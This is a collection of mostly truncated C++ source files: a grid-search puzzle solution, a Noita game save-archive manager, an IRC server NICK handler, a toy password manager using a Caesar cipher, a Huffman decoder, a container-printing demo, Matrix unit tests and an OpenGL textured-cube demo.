    "#include <iostream>\n#include <algorithm>\n#include <vector>\n#include <deque>\nusing namespace std;\nint M,N;\nvector<pair<int,int>> teacher;\nint bfs();\nbool availableLine(int x, int y);\nbool isTeacher(int x,int y);\n\nint** dp;\n\nint main()\n{\n\tcin>>N>>M;\n\tteacher.resize(M);\n\tdp = new int*[2*N];\n\tfor(int i=0;i<2*N;i++)\n\t\tdp[i] = new int[N];\n\tfor(int i=0;i<2*N;i++)\n\t\tfor(int j=0;j<N;j++)\n\t\t\tdp[i][j]=0;\n\tfor(int i=0;i<M;i++)\n\t{\n\t\tcin >> teacher[i].first>>teacher[i].second;\n\t}\n\n\tcout << bfs();\n}\n\nint bfs()\n{\n\tint res=0;\n\tdeque<pair<int,int>> dq;\n\tdq.push_back({0,0});\n\twhile(!dq.empty())\n\t{\n\t\t\n\t\tpair<int,int> p = dq.front();\n\t\tdq.pop_front();\n\t\tif(p.first==2*N)\n\t\t\treturn res;\n\t\tif(dp[p.first][p.second]==1)\n\t\t\tcontinue;\n\n\n\t\tres = max(res,p.second);\n\t\tint dx = p.first+1;\n\t\tint dy = p.second+1;\n\t\tif(availableLine(dx,dy))\n\t\t{\n\t\t\tif(!isTeacher(dx,dy))\n\t\t\t\t\tdq.push_back({dx,dy});\n\t\t}\n\t\tdy = p.second-1;\n\t\tif(availableLine(dx,dy))\n\t\t{\n\t\t\tif(!isTeacher(dx,dy))\n\t\t\t\t\tdq.push_back({dx,dy});\n\t\t}\n\n\t}\n\treturn -1;\n}\n\nbool availableLine(int x,int y)\n{\n\tif(y<0||y>N||x>2*N)\n\t\treturn false;\n\t\n\tif(x+y>2*N)\n\t\treturn false;\n\n\treturn true;\n}\n\nbool isTeacher(int x,int y)\n{\n\tint i=0;\n\tfor(i=0;i<teacher.size();++i)\n\t{\n\t\tif(teacher[i].first==x&&teacher[i].second==y)\n\t\t\treturn true;\n\t}\n\treturn false;\n}\n",
    "#include <string>\n#include <windows.h>\n#include <ShlObj.h>\n#include <iostream>\n\n#include \"comReader.h\"\n#include \"fileUtils.h\"\n#include \"MyExpection.h\"\n\nst_time::st_time()\n{\n        auto now = std::chrono::system_clock::now();\n        auto time = std::chrono::system_clock::to_time_t(now);\n        auto lt = std::localtime(&time);\n\n        year = lt->tm_year + 1900;\n        month = lt->tm_mon + 1; // \u6708\u4efd\u4ece0\u5f00\u59cb\u8ba1\u7b97\uff0c\u6240\u4ee5\u9700\u8981\u52a0\u4e0a1\n        day = lt->tm_mday;\n        hour = lt->tm_hour;\n        minute = lt->tm_min;\n        second = lt->tm_sec;\n}\n////////////////////////////////////////\n\nvoid fileUtils::saveLog()\n{\n    infofile.open(infopath,std::ios::out|std::ios::binary);\n    infofile.write(reinterpret_cast<char*>(infos.data()),sizeof(inform)*infos.size());\n    infofile.close();\n}\n\nvoid fileUtils::save(inform info)\n{\n    fs::path newArchpath = crrpath;\n    newArchpath.append(\"Archive\"+std::to_string(infos.size()));\n    fs::create_directories(newArchpath);\n    fs::copy(datapath,newArchpath,fs::copy_options::recursive);\n    infos.push_back(info);\n    saveLog();\n}\n\nvoid fileUtils::delArchive(int index)\n{\n    fs::path p=crrpath;\n    p.append(\"Archive\"+std::to_string(index));\n    try {\n        fs::remove_all(p);\n        fs::path old;\n        while(index<(int)(infos.size()-1))\n        {\n            old=crrpath;\n            old.append(\"Archive\"+std::to_string(index+1));\n            fs::rename(old,p);\n            p=old;\n            index++;\n        }\n        infos.erase(infos.begin()+index);\n        saveLog();\n    } catch (const std::filesystem::filesystem_error& e) {\n        std::cout<<e.what()<<std::endl;\n        throw MyExpection(\"\u672a\u80fd\u5220\u9664\u5b58\u6863\");\n    }\n}\n\nvoid fileUtils::loadArchive(int index)\n{\n    try\n    {\n        fs::remove_all(datapath);\n        fs::create_directories(datapath);\n        fs::path p=crrpath;\n        p.append(\"Archive\"+std::to_string(index));\n        fs::copy(p,datapath,fs::copy_options::recursive);\n    }\n    catch(const std::exception& e)\n    {\n        std::cout << e.what() << '\\n';\n        throw MyExpection(\"\u8bfb\u6863\u5931\u8d25\");\n    }\n}\n\ndouble fileUtils::getUsageSpace()\n{\n    std::uintmax_t size = 0;\n\n    for (const auto& entry : fs::recursive_directory_iterator(crrpath))\n        if (fs::is_regular_file(entry))\n            size += fs::file_size(entry);\n\n    return static_cast<double>(size) / (1024 * 1024);\n}\n\n///////////////////////////////////////\nfileUtils::fileUtils()\n{\n    char path[MAX_PATH];\n    if (!SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path)))\n        throw MyExpection(\"\u65e0\u6cd5\u627e\u5230\u7cfb\u7edfAppData\u6587\u4ef6\u5939\");\n    datapath.assign(path);\n    if (!fs::exists(datapath))\n        throw MyExpection(\"\u65e0\u6cd5\u627e\u5230\u7cfb\u7edfAppData\u6587\u4ef6\u5939\");\n    datapath=datapath.parent_path().append(\"LocalLow\\\\Nolla_Games_Noita\\\\save00\");\n    if (!fs::exists(datapath))\n        throw MyExpection(\"\u65e0\u6cd5\u627e\u5230Noita\u5b58\u6863\u6587\u4ef6\u5939  \u8bf7\u68c0\u67e5Noita\u662f\u5426\u5b89\u88c5\");\n    crrpath=fs::current_path();\n    crrpath.append(\"Archive\");\n    fs::create_directory(crrpath);\n\n    infopath=crrpath;\n    infopath.append(\"information.log\");\n    if (!fs::exists(infopath))\n    {\n        std::fstream f(infopath,std::ios::out);\n        if (!f.is_open())\n            throw MyExpection(\"\u521b\u5efa\u65e5\u5fd7\u6587\u4ef6\u5931\u8d25\");\n        f.close();\n    }\n    else{\n        infofile.open(infopath,std::ios::in|std::ios::binary);\n        if (!infofile.is_open())\n            throw MyExpection(\"\u6253\u5f00\u65e5\u5fd7\u6587\u4ef6\u5931\u8d25\");\n\n        infofile.seekg(0, std::ios::end);\n        size_t file_size = infofile.tellg();\n        if (file_size)\n        {\n            infofile.seekg(0,std::ios::beg);\n            infos=std::vector <inform> (file_size/sizeof(inform));\n            try\n            {\n                infofile.read(reinterpret_cast<char*>(infos.data()),file_size);\n            }\n            catch(const std::exception& e)\n            {\n                throw MyExpection(\"\u8bfb\u53d6\u65e5\u5fd7\u6587\u4ef6\u5931\u8d25(Archive\u6587\u4ef6\u5939\u4e0b\u7684information.log\u635f\u574f)\");\n            }\n        }\n        infofile.close();\n    }\n}\n\nfileUtils::~fileUtils()\n{\n}\n",
    "#include \"../../include/core/Executor.hpp\"\n#include \"../../include/core/Server.hpp\"\n\nvoid Executor::parseNICK(std::vector<std::string>& cmds, std::string& msg)\n{\n\tstd::stringstream ss(msg);\n\tstd::string cmd;\n\twhile (ss >> cmd)\n\t\tcmds.push_back(cmd);\n}\n\nvoid Executor::NICK(Client& client, std::vector<std::string>& cmds)\n{\n\tif (!client.getNickFlag())\n\t{\n\t\t// PASS \ub4f1\ub85d \uc548\ub41c \ud074\ub77c\uc774\uc5b8\ud2b8\n\t\tif (!client.getPassFlag())\n\t\t{\n\t\t\tclient.sendMsg(ServerMsg::NOTREGISTERD(client.getNick()));\n\t\t\tclient.setQuitFlag(true);\n\t\t\treturn ;\n\t\t}\n\n\t\t// nickname \uc778\uc790\uac00 \uc8fc\uc5b4\uc9c0\uc9c0 \uc54a\uc740 \uacbd\uc6b0\n\t\tif (cmds.size() == 1)\n\t\t{\n\t\t\tclient.sendMsg(ServerMsg::NONICKNAMEGIVEN(client.getNick()));\n\t\t\treturn ;\n\t\t}\n\n\t\t// \uc720\ud6a8\ud558\uc9c0 \uc54a\uc740 nickname\n\t\tif (Client::isInvalidNick(cmds[1]))\n\t\t{\n\t\t\tclient.sendMsg(ServerMsg::ERRONEUSNICKNAME(client.getNick(), cmds[1]));\n\t\t\treturn ;\n\t\t}\n\n\t\t// \uc774\ubbf8 \uc874\uc7ac\ud558\ub294 nickname\n\t\tif (Client::isNicknameInUse(cmds[1]))\n\t\t{\n\t\t\tclient.sendMsg(ServerMsg::NICKNAMEINUSE(cmds[1], cmds[1]));\n\t\t\treturn ;\n\t\t}\n\n\t\t// \ub4f1\ub85d \uac00\ub2a5\ud55c NICK\uc774\ubbc0\ub85c NICK \uc124\uc815\n\t\tclient.addNick(cmds[1]);\n\t\tclient.setNickFlag(true);\n\t}\n\telse\n\t{\n\t\t// \uc778\uc790 \uac1c\uc218\uac00 \ub2e4\ub978 \uacbd\uc6b0\n\t\tif (cmds.size() == 1)\n\t\t{\n\t\t\tclient.sendMsg(ServerMsg::NONICKNAMEGIVEN(client.getNick()));\n\t\t\treturn ;\n\t\t}\n\n\t\t// \uc720\ud6a8\ud558\uc9c0 \uc54a\uc740 nickname\n\t\tif (Client::isInvalidNick(cmds[1]))\n\t\t{\n\t\t\tclient.sendMsg(ServerMsg::ERRONEUSNICKNAME(client.getNick(),cmds[1]));\n\t\t\treturn ;\n\t\t}\n\n\t\t// \uc774\ubbf8 \uc874\uc7ac\ud558\ub294 nickname\n\t\tif (Client::isNicknameInUse(cmds[1]))\n\t\t{\n\t\t\tclient.sendMsg(ServerMsg::NICKNAMEINUSE(client.getNick(),cmds[1]));\n\t\t\treturn ;\n\t\t}\n\n\t\t// nickList \uc218\uc815\n\t\tclient.changeNick(cmds[1]);\n\t}\n}",
    "#include <iostream>\r\n#include <fstream>\r\n#include <string>\r\n#include <vector>\r\n#include <cstdlib>\r\n#include <ctime>\r\n#include <algorithm>\r\n#include <cctype>\r\n#include <map>\r\n#include <sstream>\r\n#include <limits> \r\n#include <stdexcept> \r\n\r\nstd::string generateRandomPassword(int length) {\r\n    const std::string charset = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+\";\r\n    std::string password;\r\n    std::srand(static_cast<unsigned int>(std::time(nullptr)));\r\n    for (int i = 0; i < length; ++i) {\r\n        password += charset[std::rand() % charset.size()];\r\n    }\r\n    return password;\r\n}\r\n\r\nstd::string encrypt(const std::string& text, int key) {\r\n    std::string result = text;\r\n    for (char& c : result) {\r\n        if (std::isalpha(c)) {\r\n            char base = std::isupper(c) ? 'A' : 'a';\r\n            c = (c - base + key) % 26 + base;\r\n        }\r\n    }\r\n    return result;\r\n}\r\n\r\nstd::string decrypt(const std::string& text, int key) {\r\n    return encrypt(text, 26 - key);\r\n}\r\n\r\nvoid storePassword(const std::string& site, const std::string& username, const std::string& password) {\r\n    std::ofstream file(\"C:\\\\mang.txt\", std::ios::app);\r\n    if (file.is_open()) {\r\n        std::string encryptedSite = encrypt(site, 3);\r\n        std::string encryptedUsername = encrypt(username, 3);\r\n        std::string encryptedPassword = encrypt(password, 3);\r\n        file << encryptedSite << \" \" << encryptedUsername << \" \" << encryptedPassword << std::endl;\r\n        std::cout << \"Password stored successfully.\" << std::endl;\r\n    }\r\n    else {\r\n        std::cerr << \"Error: Unable to open file for storing password.\" << std::endl;\r\n        system(\"cls\");\r\n    }\r\n}\r\n\r\nstd::map<std::string, std::pair<std::string, std::string>> retrievePasswords() {\r\n    std::ifstream file(\"C:\\\\mang.txt\");\r\n    std::map<std::string, std::pair<std::string, std::string>> passwords;\r\n    if (file.is_open()) {\r\n        std::string line;\r\n        while (std::getline(file, line)) {\r\n            std::istringstream iss(line);\r\n            std::string encryptedSite, encryptedUsername, encryptedPassword;\r\n            if (iss >> encryptedSite >> encryptedUsername >> encryptedPassword) {\r\n                std::string site = decrypt(encryptedSite, 3);\r\n                std::string username = decrypt(encryptedUsername, 3);\r\n                std::string password = decrypt(encryptedPassword, 3);\r\n                passwords[site] = std::make_pair(username, password);\r\n            }\r\n        }\r\n    }\r\n    else {\r\n        std::cerr << \"Error: Unable to open password file for retrieval.\" << std::endl;\r\n    }\r\n    return passwords;\r\n}\r\n\r\nvoid clearScreen() {\r\n#ifdef _WIN32\r\n    system(\"cls\");\r\n#else\r\n    system(\"clear\");\r\n#endif\r\n}\r\n\r\nint main() {\r\n    int choice;\r\n    std::map<std::string, std::pair<std::string, std::string>> passwords;\r\n    do {\r\n        clearScreen();\r\n        passwords = retrievePasswords();\r\n        std::cout << \"\\nSecure Password Manager\\n\";\r\n        std::cout << \"1. Store New Password\\n\";\r\n        std::cout << \"2. Retrieve Password\\n\";\r\n        std::cout << \"3. Generate Random Password\\n\";\r\n        std::cout << \"4. Exit\\n\";\r\n        std::cout << \"Enter your choice: \";\r\n        std::cin >> choice;\r\n        std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n');\r\n\r\n        switch (choice) {\r\n        case 1: {\r\n            std::string site, username, password;\r\n            std::cout << \"Enter website or service name: \";\r\n            std::getline(std::cin, site);\r\n            std::cout << \"Enter username: \";\r\n            std::getline(std::cin, username);\r\n            std::cout << \"Enter password: \";\r\n            std::getline(std::cin, password);\r\n            storePassword(site, username, password);\r\n            std::cout << \"\\nPress Enter to continue...\";\r\n            std::cin.get();\r\n            break;\r\n        }\r\n        case 2: {\r\n            std::string site;\r\n            std::cout << \"Enter website or service name: \";\r\n            std::getline(std::cin, site);\r\n            auto it = passwords.find(site);\r\n            if (it != passwords.end()) {\r\n                std::cout << \"Username: \" << it->second.first << std::endl;\r\n                std::cout << \"Password: \" << it->second.second << std::endl;\r\n            }\r\n            else {\r\n                std::cout << \"Password not found for the given site.\" << std::endl;\r\n            }\r\n            std::cout << \"\\nPress Enter to continue...\";\r\n            std::cin.get();\r\n            break;\r\n        }\r\n        case 3: {\r\n            int length;\r\n            std::cout << \"Enter password length: \";\r\n            std::cin >> length;\r\n            std::cout << \"Generated Password: \" << generateRandomPassword(length) << std::endl;\r\n            std::cout << \"\\nPress Enter to continue...\";\r\n            std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\\n');\r\n            std::cin.get();\r\n            break;\r\n        }\r\n        case 4:\r\n            std::cout << \"Exi",
    "#include <iostream>\n#include <vector>\n#include <unordered_map>\n#include <bitset>\n#include <algorithm>\n#include <fstream>\n#include <string>\n#include <queue>\n#include <iomanip>\n#include \"kaitai/kaitaistream.h\"\n#include \"column_data_dictionary.h\"\n\n// Huffman Tree Node definition\nstruct HuffmanTree {\n    uint8_t c;\n    HuffmanTree* left;\n    HuffmanTree* right;\n\n    HuffmanTree(uint8_t c = 0) : c(c), left(nullptr), right(nullptr) {}\n    ~HuffmanTree() {\n        delete left;\n        delete right;\n    }\n};\n\nstd::string iso88591_to_utf8(uint8_t code) {\n    std::string utf8;\n    if (code >= 0x80) {\n        utf8.push_back(static_cast<char>(0xC2 + (code > 0xBF)));\n        utf8.push_back(static_cast<char>((code & 0x3F) + 0x80));\n    } else {\n        utf8.push_back(static_cast<char>(code));\n    }\n    return utf8;\n}\n// Function to generate the full 256-byte Huffman array from the compact 128-byte encode_array\nstd::vector<uint8_t> decompress_encode_array(const std::vector<uint8_t>& compressed) {\n    std::vector<uint8_t> full_array(256, 0);\n\n    for (size_t i = 0; i < compressed.size(); i++) {\n        uint8_t byte = compressed[i];\n        full_array[2 * i] = byte & 0x0F;         // Lower nibble\n        full_array[2 * i + 1] = (byte >> 4) & 0x0F; // Upper nibble\n    }\n\n    return full_array;\n}\n\n// Function to generate Huffman codes based on codeword lengths\nstd::unordered_map<uint8_t, std::string> generate_codes(const std::vector<uint8_t>& lengths) {\n    std::unordered_map<uint8_t, std::string> codes;\n    std::vector<std::pair<uint8_t, uint8_t>> sorted_lengths;\n\n    // Collect only the non-zero lengths and their associated symbols\n    for (auto i = 0; i < 256; i++) {\n        if (lengths[i] != 0){\n            sorted_lengths.emplace_back(lengths[i], i);\n        }\n    }\n    // Sort by length first, then by character\n    std::sort(sorted_lengths.begin(), sorted_lengths.end(), [](const auto& a, const auto& b) {\n        return a.first != b.first ? a.first < b.first : a.second < b.second;\n    });\n\n    int code = 0;\n    int last_length = 0;\n\n    for (const auto& [length, character] : sorted_lengths) {\n        if (last_length != length) {\n            code <<= (length - last_length); // Shift code by difference in lengths\n            last_length = length;\n        }\n\n        // Generate the code string representation up to 15 bits\n        codes[character] = std::bitset<15>(code).to_string().substr(15 - length);\n        code++;\n    }\n\n    return codes;\n}\n\n// Print Huffman codes\nvoid print_huffman_codes(const std::unordered_map<uint8_t, std::string>& codes) {\n    std::cout << \"Huffman Codes:\\n\";\n    for (const auto& [character, code] : codes) {\n        std::cout << (int)character <<\" - \" << character << \": \" << code << '\\n';\n        }\n}\n\n// Build Huffman tree based on generated codes\nHuffmanTree* build_huffman_tree(const std::vector<uint8_t>& encode_array) {\n    auto codes = generate_codes(encode_array);\n// print_huffman_codes(codes);\n    HuffmanTree* root = new HuffmanTree;\n\n    for (const auto& [character, code] : codes) {\n        HuffmanTree* node = root;\n        for (char bit : code) {\n            if (bit == '0') {\n                if (!node->left) node->left = new HuffmanTree;\n                node = node->left;\n            } else {\n                if (!node->right) node->right = new HuffmanTree;\n                node = node->right;\n            }\n        }\n        node->c = character;\n    }\n\n    return root;\n}\n// Decode a bitstream from start to end bit positions using the Huffman tree\nstd::string decode_substring(const std::string& bitstream, HuffmanTree* tree, uint32_t start_bit, uint32_t end_bit) {\n    std::string result;\n    const HuffmanTree* node = tree;\n    uint32_t total_bits = end_bit - start_bit;\n\n    // Adjust bit position calculation for little endian byte order\n    for (uint32_t i = 0; i < total_bits; ++i) {\n        uint32_t bit_pos = start_bit + i;\n        uint32_t byte_pos = bit_pos / 8;\n        uint32_t bit_offset = bit_pos % 8;\n\n        // Convert byte index for little endian (pair-wise)\n        byte_pos = (byte_pos & ~0x01) + (1 - (byte_pos & 0x01));\n\n        if (!node->left && !node->right) {\n            result += iso88591_to_utf8(node->c);\n            node = tree; // Reset to the root node\n        }\n\n        // Traverse the Huffman tree based on the current bit\n        if (bitstream[byte_pos] & (1 << (7 - bit_offset))) {  // Adjusting bit offset to read from MSB to LSB\n            node = node->right;\n        } else {\n            node = node->left;\n        }\n    }\n\n    // Append the last character if the final node is a leaf\n    if (!node->left && !node->right) {\n        result += iso88591_to_utf8(node->c);\n    }\n\n    return result;\n}\n\n\n// Print Huffman tree in a readable format\nvoid print_huffman_tree(HuffmanTree* node, int indent = 0) {\n    if (node == nullptr) return;\n\n    if (node->right) print_huffman_tree(node->right, indent + 4);\n\n    if (indent) std::cout << std::setw(indent) << ' ';\n    if (!node->left && ",
    "#include \"../include/container_view.h\"\n#include <iostream>\n#include <vector>\n#include <deque>\n#include <list>\n#include <set>\n#include <map>\n#include <unordered_set>\n#include <unordered_map>\n#include <array>\n#include <tuple>\n#include <forward_list>\n\nint main() {\n    // Pair\n    std::pair<int, double> p = {1, 3.14};\n    std::cout << \"Pair: \" << p << std::endl;\n\n    // Tuple\n    std::tuple<int, char, double> t = {1, 'a', 2.3};\n    std::cout << \"Tuple: \" << t << std::endl;\n\n    // Array\n    std::array<int, 3> arr = {1, 2, 3};\n    std::cout << \"Array: \" << arr << std::endl;\n\n    // Deque\n    std::deque<double> dq = {1.1, 2.2, 3.3};\n    std::cout << \"Deque: \" << dq << std::endl;\n\n    // Forward List\n    std::forward_list<int> fl = {1, 2, 3};\n    std::cout << \"Forward List: \" << fl << std::endl;\n\n    // Initializer list (note: we cannot print directly, used only for example)\n    std::initializer_list<int> il = {1, 2, 3};\n\n    // List\n    std::list<int> lst = {1, 2, 3};\n    std::cout << \"List: \" << lst << std::endl;\n\n    // Vector\n    std::vector<std::string> vec = {\"hello\", \"world\"};\n    std::cout << \"Vector: \" << vec << std::endl;\n\n    // Set\n    std::set<std::string> set = {\"apple\", \"banana\", \"cherry\"};\n    std::cout << \"Set: \" << set << std::endl;\n\n    // Multiset\n    std::multiset<int> mset = {4, 5, 4, 1};\n    std::cout << \"Multiset: \" << mset << std::endl;\n\n    // Unordered Set\n    std::unordered_set<int> uset = {4, 5, 6, 7};\n    std::cout << \"Unordered Set: \" << uset << std::endl;\n\n    // Unordered Multiset\n    std::unordered_multiset<int> umset = {4, 5, 6, 6};\n    std::cout << \"Unordered Multiset: \" << umset << std::endl;\n\n    // Map\n    std::map<char, int> map = {{'a', 1}, {'b', 2}};\n    std::cout << \"Map: \" << map << std::endl;\n\n    // Multimap\n    std::multimap<char, int> mmap = {{'a', 1}, {'a', 2}};\n    std::cout << \"Multimap: \" << mmap << std::endl;\n\n    // Unordered Map\n    std::unordered_map<char, int> umap = {{'c', 3}, {'b', 2}};\n    std::cout << \"Unordered Map: \" << umap << std::endl;\n\n    // Unordered Multimap\n    std::unordered_multimap<char, int> ummap = {{'c', 3}, {'c', 4}};\n    std::cout << \"Unordered Multimap: \" << ummap << std::endl;\n\n    return 0;\n}\n",
    "#include \"matrix.h\"\n\n#include <gtest/gtest.h>\n\nnamespace mca {\nnamespace test {\nTEST(TestShape, defaultConstructor) {\n    Shape s;\n    ASSERT_EQ(s.rows, 0);\n    ASSERT_EQ(s.columns, 0);\n}\n\nTEST(TestShape, equal) {\n    Shape s1{4, 5};\n    Shape s2{4, 5};\n    ASSERT_EQ(s1, s2);\n}\n\nTEST(TestShape, notEqual) {\n    Shape s1{4, 5};\n    Shape s2{4, 4};\n    ASSERT_NE(s1, s2);\n}\n\nTEST(TestShape, size) {\n    Shape s{3, 2};\n    ASSERT_EQ(s.size(), 3 * 2);\n}\n\n// test all constructors\nTEST(TestMatrix, constructors) {\n    Matrix<int> m;\n    ASSERT_EQ(m.getShape(), Shape(0, 0));\n    ASSERT_EQ(m.dataPtr(), nullptr);\n    Matrix<int> m1(Shape{3, 3}, -1);\n    ASSERT_EQ(m1.getShape(), Shape(3, 3));\n    ASSERT_NE(m1.dataPtr(), nullptr);\n    for (size_t i = 0; i < m.getShape().rows; i++) {\n        for (size_t j = 0; j < m.getShape().columns; j++) { ASSERT_EQ(m.get(i, j), -1); }\n    }\n    Matrix<int> m2 = Matrix<int>({{-1, -1, -1}, {-1, -1, -1}});\n    ASSERT_EQ(m2.getShape(), Shape(2, 3));\n    ASSERT_NE(m2.dataPtr(), nullptr);\n    for (size_t i = 0; i < m2.getShape().rows; i++) {\n        for (size_t j = 0; j < m2.getShape().columns; j++) { ASSERT_EQ(m2.get(i, j), -1); }\n    }\n}\n\nTEST(TestMatrix, assignments) {\n    Matrix<int> m;\n    ASSERT_EQ(m.getShape(), Shape(0, 0));\n    ASSERT_EQ(m.dataPtr(), nullptr);\n    m = Matrix<int>({3, 3}, 1);\n    ASSERT_EQ(m.getShape(), Shape(3, 3));\n    ASSERT_NE(m.dataPtr(), nullptr);\n    for (size_t i = 0; i < m.rows(); i++) {\n        for (size_t j = 0; j < m.columns(); j++) { ASSERT_EQ(m.get(i, j), 1); }\n    }\n}\n\n// test get() and getShape()\nTEST(TestMatrix, geter) {\n    Matrix<int> m({{1, 2, 3}, {4, 5, 6}, {7, 8, 9}});\n    ASSERT_EQ(m.getShape(), Shape(3, 3));\n    for (size_t i = 0; i < m.getShape().rows; i++) {\n        for (size_t j = 0; j < m.getShape().columns; j++) {\n            ASSERT_EQ(m.get(i, j), i * 3 + j + 1);\n            m.get(i, j) = 0;\n            ASSERT_EQ(m.get(i, j), 0);\n        }\n    }\n}\n\nTEST(TestMatrix, reshape) {\n    Matrix<int> m({{1, 2, 3, 4, 5, 6}});\n    ASSERT_EQ(m.getShape(), Shape(1, 6));\n    m.reshape({2, 3});\n    ASSERT_EQ(m.getShape(), Shape(2, 3));\n}\n}  // namespace test\n}  // namespace mca\n",
    "//\n// Created by ivan on 2024/5/4.\n//\n#include <GL.hpp>\n#include <Shader.hpp>\n#include <StbImage.hpp>\n#include <Camera.hpp>\n#include <spdlog/spdlog.h>\n\nint main() {\n    spdlog::set_level(spdlog::level::debug);\n\n    lgl::GL gl;\n\n    lgl::Shader shader;\n    shader.add(lgl::Shader::Type::Vertex, \"./vertexShader.glsl\");\n    shader.add(lgl::Shader::Type::Fragment, \"./fragShader.glsl\");\n    shader.link();\n\n    std::vector<float> vertices{\n        -0.5f, -0.5f, -0.5f,  0.0f, 0.0f,\n         0.5f, -0.5f, -0.5f,  1.0f, 0.0f,\n         0.5f,  0.5f, -0.5f,  1.0f, 1.0f,\n         0.5f,  0.5f, -0.5f,  1.0f, 1.0f,\n        -0.5f,  0.5f, -0.5f,  0.0f, 1.0f,\n        -0.5f, -0.5f, -0.5f,  0.0f, 0.0f,\n\n        -0.5f, -0.5f,  0.5f,  0.0f, 0.0f,\n         0.5f, -0.5f,  0.5f,  1.0f, 0.0f,\n         0.5f,  0.5f,  0.5f,  1.0f, 1.0f,\n         0.5f,  0.5f,  0.5f,  1.0f, 1.0f,\n        -0.5f,  0.5f,  0.5f,  0.0f, 1.0f,\n        -0.5f, -0.5f,  0.5f,  0.0f, 0.0f,\n\n        -0.5f,  0.5f,  0.5f,  1.0f, 0.0f,\n        -0.5f,  0.5f, -0.5f,  1.0f, 1.0f,\n        -0.5f, -0.5f, -0.5f,  0.0f, 1.0f,\n        -0.5f, -0.5f, -0.5f,  0.0f, 1.0f,\n        -0.5f, -0.5f,  0.5f,  0.0f, 0.0f,\n        -0.5f,  0.5f,  0.5f,  1.0f, 0.0f,\n\n         0.5f,  0.5f,  0.5f,  1.0f, 0.0f,\n         0.5f,  0.5f, -0.5f,  1.0f, 1.0f,\n         0.5f, -0.5f, -0.5f,  0.0f, 1.0f,\n         0.5f, -0.5f, -0.5f,  0.0f, 1.0f,\n         0.5f, -0.5f,  0.5f,  0.0f, 0.0f,\n         0.5f,  0.5f,  0.5f,  1.0f, 0.0f,\n\n        -0.5f, -0.5f, -0.5f,  0.0f, 1.0f,\n         0.5f, -0.5f, -0.5f,  1.0f, 1.0f,\n         0.5f, -0.5f,  0.5f,  1.0f, 0.0f,\n         0.5f, -0.5f,  0.5f,  1.0f, 0.0f,\n        -0.5f, -0.5f,  0.5f,  0.0f, 0.0f,\n        -0.5f, -0.5f, -0.5f,  0.0f, 1.0f,\n\n        -0.5f,  0.5f, -0.5f,  0.0f, 1.0f,\n         0.5f,  0.5f, -0.5f,  1.0f, 1.0f,\n         0.5f,  0.5f,  0.5f,  1.0f, 0.0f,\n         0.5f,  0.5f,  0.5f,  1.0f, 0.0f,\n        -0.5f,  0.5f,  0.5f,  0.0f, 0.0f,\n        -0.5f,  0.5f, -0.5f,  0.0f, 1.0f,\n    };\n    std::vector<unsigned int> indices = {\n        0, 1, 3,\n        1, 2, 3,\n    };\n\n    unsigned int vbo, vao, ebo;\n    glGenVertexArrays(1, &vao);\n    glGenBuffers(1, &vbo);\n    glGenBuffers(1, &ebo);\n\n    glBindVertexArray(vao);\n    glBindBuffer(GL_ARRAY_BUFFER, vbo);\n    glBufferData(GL_ARRAY_BUFFER, vertices.size() * sizeof(*vertices.data()), vertices.data(), GL_STATIC_DRAW);\n    glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, ebo);\n    glBufferData(GL_ELEMENT_ARRAY_BUFFER, indices.size() * sizeof(*indices.data()), indices.data(), GL_STATIC_DRAW);\n\n    auto posLoc = shader.get_attribute_location(\"aPos\");\n    glVertexAttribPointer(posLoc, 3, GL_FLOAT, GL_FALSE, 5 * sizeof(*vertices.data()), (void *) 0);\n    glEnableVertexAttribArray(posLoc);\n    auto texCoordLoc = shader.get_attribute_location(\"aTexCoord\");\n    glVertexAttribPointer(texCoordLoc, 2, GL_FLOAT, GL_FALSE, 5 * sizeof(*vertices.data()),\n                          (void *) (3 * sizeof(*vertices.data())));\n    glEnableVertexAttribArray(texCoordLoc);\n\n    unsigned int texture1;\n    glGenTextures(1, &texture1);\n    glBindTexture(GL_TEXTURE_2D, texture1);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR_MIPMAP_LINEAR);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n    lgl::StbImage image1(\"../assets/container.jpg\");\n    spdlog::info(\"image1: width = {}, height = {}, channel = {}\", image1.width(), image1.height(), image1.channel());\n    if (image1()) {\n        glTexImage2D(GL_TEXTURE_2D, 0, GL_RGB, image1.width(), image1.height(), 0, GL_RGB, GL_UNSIGNED_BYTE, image1);\n        glGenerateMipmap(GL_TEXTURE_2D);\n    } else {\n        spdlog::error(\"Failed to load texture\");\n    }\n    image1.release();\n\n    unsigned int texture2;\n    glGenTextures(1, &texture2);\n    glBindTexture(GL_TEXTURE_2D, texture2);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR_MIPMAP_LINEAR);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n    lgl::StbImage image2(\"../assets/awesomeface.png\", true);\n    spdlog::info(\"image2: width = {}, height = {}, channel = {}\", image2.width(), image2.height(), image2.channel());\n    if (image2()) {\n        glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, image2.width(), image2.height(), 0, GL_RGBA, GL_UNSIGNED_BYTE, image2);\n        glGenerateMipmap(GL_TEXTURE_2D);\n    } else {\n        spdlog::error(\"Failed to load texture\");\n    }\n    image2.release();\n\n    shader.use();\n    glUniform1i(shader.get_uniform_location(\"uTexture1\"), 0);\n    glUniform1i(shader.get_uniform_location(\"uTexture2\"), 1);\n\n    std::vector cubePositions {\n        glm::vec3( 0.1f,  0.0f,  0.0f),\n        glm::vec3( 2.0f,  5.0f, -15.0f),\n        glm::vec3(-1.5f, -2.2f, -2.5f),\n        glm::vec3(-3.8f, -2.0f, -12.3f),\n        glm::",
